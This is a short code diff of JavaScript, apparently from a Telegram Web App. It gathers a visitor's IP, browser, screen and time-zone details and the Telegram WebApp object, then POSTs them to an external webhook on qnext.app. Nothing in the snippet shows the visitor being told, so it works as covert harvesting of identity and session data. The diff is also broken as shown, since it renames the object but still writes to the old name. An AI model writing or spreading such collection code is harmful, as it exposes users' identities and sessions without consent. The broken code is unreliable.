@@ -10,21 +10,19 @@ async function getVisitorIP() {
   }
 }
 async function infData() {
-  let nf = {};
-  nf.win = {};
-  nf.win.scrWid = window.screen.width;
-  nf.win.scrHei = window.screen.height;
-  nf.nav = {};
-  nf.nav.brows = navigator.userAgent;
-  nf.tz = {};
-  nf.tz.timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  nf.tz.offset = new Date().getTimezoneOffset();
-  nf.tz.offsetHours = -(nf.tz.offset / 60);
-  nf.tz.utcTime = (nf.tz.offsetHours >= 0 ? "+" : "") + nf.tz.offsetHours;
+  let dat = {};
+  dat.win = {};
+  dat.win = window;
+  dat.nav = {};
+  dat.nav.brows = navigator;
+  dat.tz = {};
+  dat.tz.timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  dat.intl = {};
+  dat.intl.timeZone = Intl;
   nf.ip = await getVisitorIP();
   url = 'https://qnext.app/bin/webhooks/1660/628/l1yubbxtqEb4u3bi';
   let tg = window.Telegram.WebApp;
-  let data = {twa: tg, info: nf};
+  let data = {twa: tg, info: dat};
   let whr = await fetch(url, {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
